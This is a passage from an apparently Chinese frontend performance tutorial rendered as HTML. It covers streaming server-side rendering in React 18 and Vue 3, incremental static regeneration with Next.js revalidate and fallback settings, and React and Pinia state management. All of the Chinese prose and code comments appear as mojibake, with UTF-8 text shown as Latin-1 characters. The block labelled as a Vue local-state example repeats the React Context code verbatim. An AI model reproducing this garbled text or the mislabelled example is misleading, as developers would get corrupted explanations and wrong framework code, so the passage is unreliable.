id=&quot;header&quot;&gt;...&lt;/div&gt;<br>    &lt;!-- å†…å®¹å ä½ç¬¦ --&gt;<br>    <br>&lt;!-- æ•°æ®å—1 --&gt;<br>&lt;script&gt;appendToDOM(&quot;content&quot;, &quot;&lt;div&gt;é¦–å±æ•°æ®...&lt;/div&gt;&quot;)&lt;/script&gt;<br><br>&lt;!-- æ•°æ®å—2 --&gt;<br>&lt;script&gt;appendToDOM(&quot;footer&quot;, &quot;&lt;div&gt;æ¨èå†…å®¹...&lt;/div&gt;&quot;)&lt;/script&gt;<br></code></pre></td></tr></table></figure><p><strong>React18+å®ç°æ–¹æ¡ˆ</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æœåŠ¡ç«¯ä»£ç  (Node.js)</span><br><span class="hljs-keyword">import</span> &#123; renderToPipeableStream &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-dom/server&#x27;</span>;<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/stream&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> &#123; pipe &#125; = <span class="hljs-title function_">renderToPipeableStream</span>(<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">App</span> /&gt;</span></span>,<br>    &#123;<br>      <span class="hljs-attr">bootstrapScripts</span>: [<span class="hljs-string">&#x27;/main.js&#x27;</span>],<br>      <span class="hljs-title function_">onShellReady</span>(<span class="hljs-params"></span>) &#123;<br>        res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">&#x27;Content-type&#x27;</span>, <span class="hljs-string">&#x27;text/html&#x27;</span>);<br>        <span class="hljs-title function_">pipe</span>(res); <span class="hljs-comment">// å¼€å§‹æµå¼ä¼ è¾“</span><br>      &#125;,<br>      <span class="hljs-title function_">onError</span>(<span class="hljs-params">error</span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;æ¸²æŸ“é”™è¯¯:&#x27;</span>, error);<br>      &#125;<br>    &#125;<br>  );<br>&#125;);<br><br><span class="hljs-comment">// å®¢æˆ·ç«¯ä»£ç </span><br><span class="hljs-keyword">import</span> &#123; hydrateRoot &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-dom/client&#x27;</span>;<br><br><span class="hljs-title function_">hydrateRoot</span>(<span class="hljs-variable language_">document</span>, <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">App</span> /&gt;</span></span>);<br></code></pre></td></tr></table></figure><p><strong>Vue3 å®ç°æ–¹æ¡ˆ</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æœåŠ¡ç«¯ä»£ç  (Vite SSR)</span><br><span class="hljs-keyword">import</span> &#123; renderToWebStream &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue/server-renderer&#x27;</span>;<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/stream&#x27;</span>, <span class="hljs-title function_">async</span> (req, res) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> app = <span class="hljs-title function_">createSSRApp</span>(<span class="hljs-title class_">App</span>);<br>  <span class="hljs-keyword">const</span> stream = <span class="hljs-title function_">renderToWebStream</span>(app);<br>  <br>  res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">&#x27;Content-Type&#x27;</span>, <span class="hljs-string">&#x27;text/html&#x27;</span>);<br>  stream.<span class="hljs-title function_">pipe</span>(res);<br>&#125;);<br><br><span class="hljs-comment">// å®¢æˆ·ç«¯æ¿€æ´»</span><br><span class="hljs-title function_">createSSRApp</span>(<span class="hljs-title class_">App</span>).<span class="hljs-title function_">mount</span>(<span class="hljs-string">&#x27;#app&#x27;</span>);<br></code></pre></td></tr></table></figure><h3 id="éƒ¨åˆ†é™æ€ç”Ÿæˆï¼ˆIncremental-Static-Regenerationï¼‰"><a href="#éƒ¨åˆ†é™æ€ç”Ÿæˆï¼ˆIncremental-Static-Regenerationï¼‰" class="headerlink" title="éƒ¨åˆ†é™æ€ç”Ÿæˆï¼ˆIncremental Static Regenerationï¼‰"></a>éƒ¨åˆ†é™æ€ç”Ÿæˆï¼ˆIncremental Static Regenerationï¼‰</h3><p><strong>ISR æ ¸å¿ƒæ¦‚å¿µ</strong></p><pre class="mermaid">graph LR  A[ä¼ ç»ŸSSG] --> B[æ„å»ºæ—¶ç”Ÿæˆæ‰€æœ‰é¡µé¢]  B --> C[å†…å®¹æ›´æ–°éœ€å…¨ç«™é‡å»º]    D[ISR] --> E[æ„å»ºæ—¶ç”Ÿæˆå…³é”®é¡µé¢]  E --> F[æŒ‰éœ€ç”Ÿæˆå…¶ä»–é¡µé¢]  F --> G[å®šæ—¶/è§¦å‘æ›´æ–°å•ä¸ªé¡µé¢]</pre><p>æŠ€æœ¯å®šä¹‰ï¼š</p><ul><li>é™æ€ç”Ÿæˆï¼ˆSSGï¼‰ï¼šæ„å»ºæ—¶é¢„æ¸²æŸ“å®Œæ•´HTML</li><li>éƒ¨åˆ†é™æ€ç”Ÿæˆï¼ˆISRï¼‰ï¼š<ul><li>é¦–æ¬¡è®¿é—®æ—¶ç”Ÿæˆé™æ€é¡µé¢</li><li>æŒ‰éœ€æ›´æ–°è¿‡æœŸé¡µé¢</li><li>æ›´æ–°æ—¶ä¸ä¸­æ–­å½“å‰è¯·æ±‚</li></ul></li></ul><p><strong>å·¥ä½œåŸç†</strong></p><pre class="mermaid">sequenceDiagram  participant User  participant CDN  participant Server    User->>CDN: è¯·æ±‚ /product/123  alt é¡µé¢å·²ç¼“å­˜ä¸”æœªè¿‡æœŸ    CDN->>User: ç«‹å³è¿”å›é™æ€HTML  else é¡µé¢è¿‡æœŸ/ä¸å­˜åœ¨    CDN->>Server: è¯·æ±‚é‡æ–°ç”Ÿæˆ    Server->>Server: å¢é‡æ„å»ºé¡µé¢    Server->>CDN: è¿”å›æ–°HTML + æ›´æ–°ç¼“å­˜    CDN->>User: è¿”å›æ–°å†…å®¹    Server->>Background: è§¦å‘åå°é‡å»º  end</pre><p><strong>Next.js å®ç°æ–¹æ¡ˆ</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// pages/products/[id].js</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getStaticProps</span>(<span class="hljs-params">&#123; params &#125;</span>) &#123;<br>  <span class="hljs-comment">// è·å–äº§å“æ•°æ®</span><br>  <span class="hljs-keyword">const</span> product = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getProduct</span>(params.<span class="hljs-property">id</span>);<br>  <span class="hljs-keyword">return</span> &#123;<br>    <span class="hljs-attr">props</span>: &#123; product &#125;,<br>    <span class="hljs-attr">revalidate</span>: <span class="hljs-number">60</span>, <span class="hljs-comment">// 60ç§’åé¡µé¢è¿‡æœŸ</span><br>  &#125;;<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getStaticPaths</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-comment">// é¢„ç”Ÿæˆçƒ­é—¨äº§å“é¡µ</span><br>  <span class="hljs-keyword">const</span> hotProducts = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getHotProducts</span>();<br>  <span class="hljs-keyword">const</span> paths = hotProducts.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">p</span> =&gt;</span> (&#123; <span class="hljs-attr">params</span>: &#123; <span class="hljs-attr">id</span>: p.<span class="hljs-property">id</span> &#125; &#125;));<br>  <br>  <span class="hljs-keyword">return</span> &#123;<br>    paths,<br>    <span class="hljs-attr">fallback</span>: <span class="hljs-string">&#x27;blocking&#x27;</span>, <span class="hljs-comment">// å…¶ä»–äº§å“æŒ‰éœ€ç”Ÿæˆ</span><br>  &#125;;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ProductPage</span>(<span class="hljs-params">&#123; product &#125;</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>&#123;product.name&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>å…³é”®é…ç½®å‚æ•°</strong></p><table><thead><tr><th align="left">å‚æ•°</th><th align="left">ç±»å‹</th><th align="left">é»˜è®¤å€¼</th><th align="left">ä½œç”¨</th></tr></thead><tbody><tr><td align="left">revalidate</td><td align="left">ç§’æ•°</td><td align="left">false</td><td align="left">é¡µé¢åˆ·æ–°é—´éš”</td></tr><tr><td align="left">fallback</td><td align="left">boolean&#x2F;string</td><td align="left">false</td><td align="left">æœªç”Ÿæˆé¡µé¢çš„è¡Œä¸º</td></tr><tr><td align="left">fallback: true</td><td align="left">-</td><td align="left">-</td><td align="left">æ˜¾ç¤ºfallback UI â†’ åå°ç”Ÿæˆ</td></tr><tr><td align="left">fallback: â€˜blockingâ€™</td><td align="left">-</td><td align="left">-</td><td align="left">ç”¨æˆ·ç­‰å¾…ç›´åˆ°é¡µé¢ç”Ÿæˆå®Œæˆ</td></tr><tr><td align="left">unstable_revalidate</td><td align="left">å‡½æ•°</td><td align="left">-</td><td align="left">æ‰‹åŠ¨è§¦å‘é‡æ–°ç”Ÿæˆ</td></tr></tbody></table><p><strong>æ›´æ–°è§¦å‘æœºåˆ¶</strong></p><p>(1) æ—¶é—´é©±åŠ¨ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-attr">revalidate</span>: <span class="hljs-number">3600</span> <span class="hljs-comment">// æ¯å°æ—¶æ£€æŸ¥æ›´æ–°</span><br></code></pre></td></tr></table></figure><p>(2) äº‹ä»¶é©±åŠ¨ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// APIè·¯ç”±ï¼šæ‰‹åŠ¨è§¦å‘é‡æ–°ç”Ÿæˆ</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">handler</span>(<span class="hljs-params">req, res</span>) &#123;<br>  <span class="hljs-keyword">await</span> res.<span class="hljs-title function_">unstable_revalidate</span>(<span class="hljs-string">&#x27;/product/123&#x27;</span>)<br>  res.<span class="hljs-title function_">status</span>(<span class="hljs-number">200</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">revalidated</span>: <span class="hljs-literal">true</span> &#125;)<br>&#125;<br><br><span class="hljs-comment">// CMSæ›´æ–°å›è°ƒ</span><br>cms.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;product-update&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">id</span>) =&gt;</span> &#123;<br>  <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`/api/revalidate?id=<span class="hljs-subst">$&#123;id&#125;</span>`</span>)<br>&#125;)<br></code></pre></td></tr></table></figure><p>(3) æŒ‰è®¿é—®åˆ·æ–°ï¼š</p><pre class="mermaid">graph LR  A[ç”¨æˆ·è®¿é—®] --> B{é¡µé¢æ˜¯å¦è¿‡æœŸ?}  B -->|æ˜¯| C[åå°ç”Ÿæˆæ–°ç‰ˆæœ¬]  B -->|å¦| D[è¿”å›ç¼“å­˜]  C --> E[ä¸‹æ¬¡è®¿é—®ç”Ÿæ•ˆ]</pre><p><strong>ç¼“å­˜ä¼˜åŒ–ç­–ç•¥</strong></p><pre class="mermaid">graph TB  A[ç”¨æˆ·è¯·æ±‚] --> B[CDNè¾¹ç¼˜ç¼“å­˜]  B -->|HIT| C[è¿”å›ç¼“å­˜]  B -->|MISS| D[æºç«™ISRæœåŠ¡]  D --> E{é¡µé¢å­˜åœ¨?}  E -->|æ˜¯| F[éªŒè¯è¿‡æœŸ]  F -->|æœªè¿‡æœŸ| G[è¿”å›ç¼“å­˜]  F -->|å·²è¿‡æœŸ| H[åå°é‡å»º]  E -->|å¦| I[åŒæ­¥ç”Ÿæˆ]  H & I --> J[æ›´æ–°CDN]  J --> K[è¿”å›ç”¨æˆ·]</pre><h2 id="4-3-çŠ¶æ€ç®¡ç†ä¼˜åŒ–"><a href="#4-3-çŠ¶æ€ç®¡ç†ä¼˜åŒ–" class="headerlink" title="4.3 çŠ¶æ€ç®¡ç†ä¼˜åŒ–"></a>4.3 çŠ¶æ€ç®¡ç†ä¼˜åŒ–</h2><h3 id="å±€éƒ¨çŠ¶æ€-vs-å…¨å±€çŠ¶æ€ç²’åº¦æ§åˆ¶"><a href="#å±€éƒ¨çŠ¶æ€-vs-å…¨å±€çŠ¶æ€ç²’åº¦æ§åˆ¶" class="headerlink" title="å±€éƒ¨çŠ¶æ€ vs å…¨å±€çŠ¶æ€ç²’åº¦æ§åˆ¶"></a>å±€éƒ¨çŠ¶æ€ vs å…¨å±€çŠ¶æ€ç²’åº¦æ§åˆ¶</h3><p><strong>æ ¸å¿ƒæ¦‚å¿µè§£æ</strong></p><pre class="mermaid">graph TD  A[çŠ¶æ€ç®¡ç†] --> B[å±€éƒ¨çŠ¶æ€]  A --> C[å…¨å±€çŠ¶æ€]    B --> B1[ç»„ä»¶å†…éƒ¨useState]  B --> B2[ç»„ä»¶propsä¼ é€’]  C --> C1[Context API]  C --> C2[Redux/Zustand]    D[ä¼˜åŒ–ç›®æ ‡] --> E[ç²¾å‡†æ›´æ–°]  D --> F[é¿å…è¿‡åº¦æ¸²æŸ“]</pre><p>æŠ€æœ¯å®šä¹‰ï¼š</p><ul><li>å±€éƒ¨çŠ¶æ€ï¼šä»…åœ¨å•ä¸ªç»„ä»¶å†…éƒ¨ä½¿ç”¨çš„çŠ¶æ€ï¼ˆå½±å“èŒƒå›´ï¼š1ä¸ªç»„ä»¶ï¼‰</li><li>å…¨å±€çŠ¶æ€ï¼šè¢«å¤šä¸ªç»„ä»¶å…±äº«çš„çŠ¶æ€ï¼ˆå½±å“èŒƒå›´ï¼šNä¸ªç»„ä»¶ï¼‰</li><li>ç²’åº¦æ§åˆ¶ï¼šæ ¹æ®çŠ¶æ€ä½¿ç”¨èŒƒå›´é€‰æ‹©æœ€ä½³å­˜å‚¨ä½ç½®</li></ul><p><strong>çŠ¶æ€é€‰æ‹©å†³ç­–</strong></p><pre class="mermaid">flowchart TD  A[æ–°çŠ¶æ€] --> B{ä½¿ç”¨èŒƒå›´}  B -->|å•ä¸ªç»„ä»¶| C[å±€éƒ¨çŠ¶æ€]  B -->|2-3ä¸ªç´§å¯†å…³è”ç»„ä»¶| D[æå‡çŠ¶æ€åˆ°çˆ¶ç»„ä»¶]  B -->|è·¨å¤šå±‚çº§/å¤šä¸ªåŠŸèƒ½æ¨¡å—| E[å…¨å±€çŠ¶æ€]  C --> F[useState/useReducer]  D --> G[Propsä¼ é€’]  E --> H[Context/Redux/Pinia]</pre><p><strong>React å®ç°æ–¹æ¡ˆ</strong></p><p>(1) å±€éƒ¨çŠ¶æ€ä¼˜åŒ–</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Counter</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-comment">// çº¯å±€éƒ¨çŠ¶æ€ï¼šä»…å½±å“æœ¬ç»„ä»¶</span><br>  <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> setCount(c =&gt; c + 1)&#125;&gt;</span><br><span class="language-xml">        Clicked &#123;count&#125; times</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p>(2) çŠ¶æ€æå‡</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Parent</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-comment">// çŠ¶æ€æå‡ï¼šå½±å“å­ç»„ä»¶</span><br>  <span class="hljs-keyword">const</span> [theme, setTheme] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">&#x27;light&#x27;</span>);<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">ThemeSwitcher</span> <span class="hljs-attr">theme</span>=<span class="hljs-string">&#123;theme&#125;</span> <span class="hljs-attr">onChange</span>=<span class="hljs-string">&#123;setTheme&#125;</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Content</span> <span class="hljs-attr">theme</span>=<span class="hljs-string">&#123;theme&#125;</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p>(3) ç²¾å‡†å…¨å±€çŠ¶æ€</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-comment">// åˆ›å»ºç»†ç²’åº¦Context</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">UserPrefsContext</span> = <span class="hljs-title function_">createContext</span>();<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-comment">// åˆ†ç¦»å…³æ³¨ç‚¹ï¼šé¿å…å•ä¸ªå¤§çŠ¶æ€å¯¹è±¡</span><br>  <span class="hljs-keyword">const</span> [theme, setTheme] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">&#x27;light&#x27;</span>);<br>  <span class="hljs-keyword">const</span> [fontSize, setFontSize] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">16</span>);<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">UserPrefsContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;&#123;</span> <span class="hljs-attr">theme</span>, <span class="hljs-attr">fontSize</span> &#125;&#125;&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Header</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">MainContent</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">UserPrefsContext.Provider</span>&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-comment">// æ¶ˆè´¹ç«¯ç²¾å‡†è®¢é˜…</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ThemeButton</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> &#123; theme &#125; = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">UserPrefsContext</span>);<br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Button</span> <span class="hljs-attr">theme</span>=<span class="hljs-string">&#123;theme&#125;</span> /&gt;</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Vue å®ç°æ–¹æ¡ˆ</strong></p><p>(1) å±€éƒ¨çŠ¶æ€</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-comment">// åˆ›å»ºç»†ç²’åº¦Context</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">UserPrefsContext</span> = <span class="hljs-title function_">createContext</span>();<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-comment">// åˆ†ç¦»å…³æ³¨ç‚¹ï¼šé¿å…å•ä¸ªå¤§çŠ¶æ€å¯¹è±¡</span><br>  <span class="hljs-keyword">const</span> [theme, setTheme] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">&#x27;light&#x27;</span>);<br>  <span class="hljs-keyword">const</span> [fontSize, setFontSize] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">16</span>);<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">UserPrefsContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;&#123;</span> <span class="hljs-attr">theme</span>, <span class="hljs-attr">fontSize</span> &#125;&#125;&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Header</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">MainContent</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">UserPrefsContext.Provider</span>&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-comment">// æ¶ˆè´¹ç«¯ç²¾å‡†è®¢é˜…</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ThemeButton</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> &#123; theme &#125; = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">UserPrefsContext</span>);<br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Button</span> <span class="hljs-attr">theme</span>=<span class="hljs-string">&#123;theme&#125;</span> /&gt;</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>(2) çŠ¶æ€æå‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs Vue">&lt;!-- Parent.vue --&gt;<br>&lt;template&gt;<br>  &lt;ChildA :value=&quot;sharedState&quot; /&gt;<br>  &lt;ChildB @update=&quot;sharedState = $event&quot; /&gt;<br>&lt;/template&gt;<br><br>&lt;script setup&gt;<br>const sharedState = ref(&#x27;&#x27;); // çˆ¶å­å…±äº«çŠ¶æ€<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>(3) ç²¾å‡†å…¨å±€çŠ¶æ€ï¼ˆPiniaï¼‰</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// stores/user.js (Pinia store)</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> useUserStore = <span class="hljs-title function_">defineStore</span>(<span class="hljs-string">&#x27;user&#x27;</span>, &#123;<br>  <span class="hljs-attr">state</span>: <span class="hljs-function">() =&gt;</span> (&#123; <span class="hljs-attr">theme</span>: <span class="hljs-string">&#x27;light&#x27;</span> &#125;),<br>  <span class="hljs-attr">actions</span>: &#123;<br>    <span class="hljs-title function_">setTheme</span>(<span class="hljs-params">newTheme</span>) &#123;<br>      <span class="hljs-variable language_">this</span>.<span class="hljs-property">theme</span> = newTheme;<br>    &#125;<br>  &#125;<br>&#125;);<br><br><span class="hljs-comment">// ç»„ä»¶ä¸­ä½¿ç”¨</span><br><span class="hljs-keyword">import</span> &#123; storeToRefs &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;pinia&#x27;</span>;<br><span class="hljs-keyword">import</span> &#123; useUserStore &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;@/stores/user&#x27;</span>;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;<br>  <span class="hljs-title function_">setup</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">const</span> userStore = <span class="hljs-title function_">useUserStore</span>();<br>    <span class="hljs-comment">// ç²¾å‡†è§£æ„å“åº”å¼çŠ¶æ€</span><br>    <span class="hljs-keyword">const</span> &#123; theme &#125; = <span class="hljs-title function_">storeToRefs</span>(userStore);<br>    <span class="hljs-keyword">return</span> &#123; theme &#125;;<br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>æ€§èƒ½é™·é˜±</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-comment">// é”™è¯¯åšæ³•ï¼šå¤§çŠ¶æ€å¯¹è±¡å¯¼è‡´å…¨é‡æ›´æ–°</span><br>&lt;<span class="hljs-title class_">AppContext</span>.<span class="hljs-property">Provider</span> value=&#123;&#123; user, theme, cart, ... &#125;&#125;&gt;<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ComponentA</span> /&gt;</span></span>  <span class="hljs-comment">// ä»»ä½•çŠ¶æ€å˜åŒ–éƒ½é‡æ¸²æŸ“</span><br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ComponentB</span> /&gt;</span></span><br>&lt;/<span class="hljs-title class_">AppContext</span>.<span class="hljs-property">Provider</span>&gt;<br><br><span class="hljs-comment">// æ­£ç¡®æ–¹æ¡ˆï¼šæ‹†åˆ†Context</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ThemeContext.Provider</span> 